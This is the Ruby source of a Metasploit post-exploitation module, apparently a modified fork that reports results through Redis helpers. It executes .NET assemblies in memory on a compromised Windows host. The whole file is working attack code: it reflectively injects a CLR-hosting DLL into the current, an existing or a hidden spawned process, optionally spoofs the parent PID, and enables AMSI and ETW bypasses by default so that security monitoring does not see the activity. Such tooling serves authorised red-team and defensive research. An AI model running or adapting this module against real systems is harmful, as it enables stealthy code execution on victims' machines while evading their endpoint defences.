##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'base64'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Exploit::Retry
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Dotnet

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Execute .net Assembly (x64 only)',
        'Description' => %q{
          This module executes a .NET assembly in memory. It
          reflectively loads a dll that will host CLR, then it copies
          the assembly to be executed into memory. Credits for AMSI
          bypass to Rastamouse (@_RastaMouse)
        },
        'License' => MSF_LICENSE,
        'Author' => 'b4rtik',
        'Arch' => [ARCH_X64],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [['Windows x64', { 'Arch' => ARCH_X64 }]],
        'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
        'DefaultTarget' => 0,
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_attach
              stdapi_sys_process_execute
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_kill
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_write
              stdapi_sys_process_thread_create
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    spawn_condition = ['TECHNIQUE', '==', 'SPAWN_AND_INJECT']
    inject_condition = ['TECHNIQUE', '==', 'INJECT']

    register_options(
      [
        OptEnum.new('TECHNIQUE', [true, 'Technique for executing assembly', 'SELF', ['SELF', 'INJECT', 'SPAWN_AND_INJECT']]),
        OptString.new('DOTNET_EXE', [true, 'Assembly file name']),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
        OptBool.new('AMSIBYPASS', [true, 'Enable AMSI bypass', true]),
        OptBool.new('ETWBYPASS', [true, 'Enable ETW bypass', true]),

        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe'], conditions: spawn_condition),
        OptBool.new('USETHREADTOKEN', [false, 'Spawn process using the current thread impersonation', true], conditions: spawn_condition),
        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process (no PPID spoofing if unset)', nil], conditions: spawn_condition),

        OptInt.new('PID', [false, 'PID to inject into', nil], conditions: inject_condition),
        OptInt.new('WAIT', [false, 'Time in seconds to wait', 10]),
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('KILL', [true, 'Kill the launched process at the end of the task', true], conditions: spawn_condition)
      ]
    )

    self.terminate_process = false
    self.hprocess = nil
    self.handles_to_close = []
  end

  def find_required_clr(exe_path)
    filecontent = File.read(exe_path).bytes
    sign = 'v4.0.30319'.bytes
    filecontent.each_with_index do |_item, index|
      sign.each_with_index do |subitem, indexsub|
        break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)

        if indexsub == 9
          vprint_status('CLR version required: v4.0.30319')
          return 'v4.0.30319'
        end
      end
    end
    vprint_status('CLR version required: v2.0.50727')
    'v2.0.50727'
  end

  def check_requirements(clr_req, installed_dotnet_versions)
    installed_dotnet_versions.each do |fi|
      if clr_req == 'v4.0.30319'
        if fi[0] == '4'
          vprint_status('Requirements ok')
          return true
        end
      elsif clr_req == 'v2.0.50727'
        if fi[0] == '3' || fi[0] == '2'
          vprint_status('Requirements ok')
          return true
        end
      end
    end
    print_error_redis('Required dotnet version not present')
    false
  end

  def run
    if File.file?(File.join(Msf::Config.loot_directory, datastore['DOTNET_EXE']))
      exe_path = File.join(Msf::Config.loot_directory, datastore['DOTNET_EXE'])
    elsif File.file?(datastore['DOTNET_EXE'])
      exe_path = datastore['DOTNET_EXE']
    else
      pub_json_result(false,
                      "#{datastore['DOTNET_EXE']} not found",
                      nil,
                      self.uuid)
      return
    end

    installed_dotnet_versions = get_dotnet_versions
    print_status_redis("Dot Net Versions installed on target: #{installed_dotnet_versions}")
    if installed_dotnet_versions == []
      pub_json_result(false,
                      'Target has no .NET framework installed',
                      nil,
                      self.uuid)
      return
    end
    rclr = find_required_clr(exe_path)
    if check_requirements(rclr, installed_dotnet_versions) == false
      pub_json_result(false,
                      'CLR required for assembly not installed',
                      nil,
                      self.uuid)
      return
    end

    if sysinfo.nil?
      pub_json_result(false,
                      'Session invalid',
                      nil,
                      self.uuid)
    else
      print_status_redis("Running module against #{sysinfo['Computer']}")
    end

    execute_assembly(exe_path, rclr)
  end

  def cleanup
    if terminate_process && !hprocess.nil? && !hprocess.pid.nil?
      print_good_redis("Killing process #{hprocess.pid}")
      begin
        client.sys.process.kill(hprocess.pid)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_warning_redis("Error while terminating process: #{e}")
        print_warning_redis('Process may already have terminated')
      end
    end

    handles_to_close.each(&:close)
  end

  def sanitize_process_name(process_name)
    if process_name.split(//).last(4).join.eql? '.exe'
      out_process_name = process_name
    else
      "#{process_name}.exe"
    end
    out_process_name
  end

  def pid_exists(pid)
    host_processes = client.sys.process.get_processes
    if host_processes.empty?
      print_error_redis('No running processes found on the target host.')
      return false
    end

    theprocess = host_processes.find { |x| x['pid'] == pid }

    !theprocess.nil?
  end

  def launch_process
    if datastore['PROCESS'].nil?
      pub_json_result(false,
                      'Spawn and inject selected, but no process was specified',
                      nil,
                      self.uuid)
      fail_with(Failure::BadConfig, 'Spawn and inject selected, but no process was specified')

    end

    ppid_selected = datastore['PPID'] != 0 && !datastore['PPID'].nil?
    if ppid_selected && !pid_exists(datastore['PPID'])
      pub_json_result(false,
                      "Process #{datastore['PPID']} was not found",
                      nil,
                      self.uuid)
      fail_with(Failure::BadConfig, "Process #{datastore['PPID']} was not found")
    elsif ppid_selected
      print_status_redis("Spoofing PPID #{datastore['PPID']}")
    end

    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status_redis("Launching #{process_name} to host CLR...")

    begin
      process = client.sys.process.execute(process_name, nil, {
        'Channelized' => false,
        'Hidden' => true,
        'UseThreadToken' => !(!datastore['USETHREADTOKEN']),
        'ParentPid' => datastore['PPID']
      })
      hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    rescue Rex::Post::Meterpreter::RequestError => e
      pub_json_result(false,
                      "Unable to launch process: #{e}",
                      nil,
                      self.uuid)
      fail_with(Failure::BadConfig, "Unable to launch process: #{e}")
    end

    print_good_redis("Process #{hprocess.pid} launched.")
    hprocess
  end

  def inject_hostclr_dll(process)
    print_status_redis("Reflectively injecting the Host DLL into #{process.pid}..")

    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')
    library_path = ::File.expand_path(library_path)

    print_status_redis("Injecting Host into #{process.pid}...")
    # Memory management note: this memory is freed by the C++ code itself upon completion
    # of the assembly
    inject_dll_into_process(process, library_path)
  end

  def open_process(pid)
    if (pid == 0) || pid.nil?
      pub_json_result(false,
                      'Inject technique selected, but no PID set',
                      nil,
                      self.uuid)
      fail_with(Failure::BadConfig, 'Inject technique selected, but no PID set')
    end

    if pid_exists(pid)
      print_status_redis("Opening handle to process #{pid}...")
      begin
        hprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
      rescue Rex::Post::Meterpreter::RequestError => e
        pub_json_result(false,
                        "Unable to access process #{pid}: #{e}",
                        nil,
                        self.uuid)
        fail_with(Failure::BadConfig, "Unable to access process #{pid}: #{e}")
      end
      print_good_redis('Handle opened')
      hprocess
    else
      pub_json_result(false,
                      'PID not found',
                      nil,
                      self.uuid)
      fail_with(Failure::BadConfig, 'PID not found')
    end
  end

  def check_process_suitability(pid)
    process = session.sys.process.each_process.find { |i| i['pid'] == pid }
    if process.nil?
      pub_json_result(false,
                      'PID not found',
                      nil,
                      self.uuid)
      fail_with(Failure::BadConfig, 'PID not found')
    end

    arch = process['arch']

    if arch != ARCH_X64
      pub_json_result(false,
                      'execute_dotnet_assembly currently only supports x64 processes',
                      nil,
                      self.uuid)
      fail_with(Failure::BadConfig, 'execute_dotnet_assembly currently only supports x64 processes')
    end
  end

  def execute_assembly(exe_path, clr_version)
    if datastore['TECHNIQUE'] == 'SPAWN_AND_INJECT'
      self.hprocess = launch_process
      self.terminate_process = datastore['KILL']
      check_process_suitability(hprocess.pid)
    else
      if datastore['TECHNIQUE'] == 'INJECT'
        inject_pid = datastore['PID']
      elsif datastore['TECHNIQUE'] == 'SELF'
        inject_pid = client.sys.process.getpid
      end
      check_process_suitability(inject_pid)

      self.hprocess = open_process(inject_pid)
    end

    handles_to_close.append(hprocess)

    begin
      exploit_mem, offset = inject_hostclr_dll(hprocess)

      pipe_suffix = Rex::Text.rand_text_alphanumeric(8)
      pipe_name = "\\\\.\\pipe\\#{pipe_suffix}"
      appdomain_name = Rex::Text.rand_text_alpha(9)
      vprint_status("Connecting with CLR via #{pipe_name}")
      vprint_status("Running in new AppDomain: #{appdomain_name}")
      assembly_mem = copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, hprocess)
    rescue Rex::Post::Meterpreter::RequestError => e
      pub_json_result(false,
                      "Error while allocating memory: #{e}",
                      nil,
                      self.uuid)
      fail_with(Failure::PayloadFailed, "Error while allocating memory: #{e}")
    end

    print_status_redis('Executing...')
    begin
      thread = hprocess.thread.create(exploit_mem + offset, assembly_mem)
      handles_to_close.append(thread)

      pipe = nil
      retry_until_truthy(timeout: datastore['WAIT']) do
        pipe = client.fs.file.open(pipe_name)
        true
      rescue Rex::Post::Meterpreter::RequestError => e
        if e.code != Msf::WindowsError::FILE_NOT_FOUND
          # File not found is expected, since the pipe may not be set up yet.
          # Any other error would be surprising.
          vprint_error("Error while attaching to named pipe: #{e.inspect}")
        end
        false
      end

      if pipe.nil?
        pub_json_result(false,
                        'Unable to connect to output stream',
                        nil,
                        self.uuid)
        fail_with(Failure::PayloadFailed, 'Unable to connect to output stream')
      end

      basename = File.basename(datastore['DOTNET_EXE'])
      dir = Msf::Config.log_directory + File::SEPARATOR + 'dotnet'
      unless Dir.exist?(dir)
        Dir.mkdir(dir)
      end
      logfile = dir + File::SEPARATOR + "log_#{basename}_#{Time.now.strftime('%Y%m%d%H%M%S')}"
      read_output(pipe, logfile)
      # rubocop:disable Lint/RescueException
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::PayloadFailed, e.message)
      pub_json_result(false,
                      e.message,
                      nil,
                      self.uuid)
    rescue ::Exception => e
      # rubocop:enable Lint/RescueException
      unless terminate_process
        # We don't provide a trigger to the assembly to self-terminate, so it will continue on its merry way.
        # Because named pipes don't have an infinite buffer, if too much additional output is provided by the
        # assembly, it will block until we read it. So it could hang at an unpredictable location.
        # Also, since we can't confidently clean up the memory of the DLL that may still be running, there
        # will also be a memory leak.

        reason = 'terminating due to exception'
        if e.is_a?(::Interrupt)
          reason = 'interrupted'
        end
        print_warning_redis("Execution #{reason}. Assembly may still be running. However, as we are no longer retrieving output, it may block at an unpredictable location.")
        pub_json_result(false,
                        "Execution #{reason}. Assembly may still be running. However, as we are no longer retrieving output, it may block at an unpredictable location.",
                        nil,
                        self.uuid)
      end

      raise
    end

    print_good_redis('Execution finished.')
  end

  def copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, process)
    print_status("Host injected. Copy assembly into #{process.pid}...")
    # Structure:
    # - Packed metadata (string/data lengths, flags)
    # - Pipe Name
    # - Appdomain Name
    # - CLR Version
    # - Param data
    # - Assembly data
    assembly_size = File.size(exe_path)

    cln_params = ''
    cln_params << datastore['ARGUMENTS'] unless datastore['ARGUMENTS'].nil?
    cln_params << "\x00"

    pipe_name = pipe_name.encode(::Encoding::ASCII_8BIT)
    appdomain_name = appdomain_name.encode(::Encoding::ASCII_8BIT)
    clr_version = clr_version.encode(::Encoding::ASCII_8BIT)
    params = [
      pipe_name.bytesize,
      appdomain_name.bytesize,
      clr_version.bytesize,
      cln_params.length,
      assembly_size,
      datastore['AMSIBYPASS'] ? 1 : 0,
      datastore['ETWBYPASS'] ? 1 : 0,
    ].pack('IIIIICC')

    payload = params
    payload += pipe_name
    payload += appdomain_name
    payload += clr_version
    payload += cln_params
    payload += File.read(exe_path)

    payload_size = payload.length

    # Memory management note: this memory is freed by the C++ code itself upon completion
    # of the assembly
    allocated_memory = process.memory.allocate(payload_size, PROT_READ | PROT_WRITE)
    process.memory.write(allocated_memory, payload)
    print_status_redis('Assembly copied.')
    allocated_memory
  end

  def read_output(pipe, logfilename)
    print_status_redis('Start reading output')

    print_status_redis("Writing output to #{logfilename}")
    logfile = File.open(logfilename, 'wb+')
    output_all = "".b
    begin
      loop do
        output = pipe.read(1024)
        if !output.nil? && !output.empty?
          logfile.write(output)
          output_all = output_all + output
        end
        break if output.nil? || output.empty?
      end
    rescue ::StandardError => e
      print_error_redis("Exception: #{e.inspect}")
    end
    pub_json_result(true,
                    nil,
                    Base64.encode64(output_all),
                    self.uuid)
    logfile.close
    print_status_redis('End output.')
  end

  attr_accessor :terminate_process, :hprocess, :handles_to_close
end
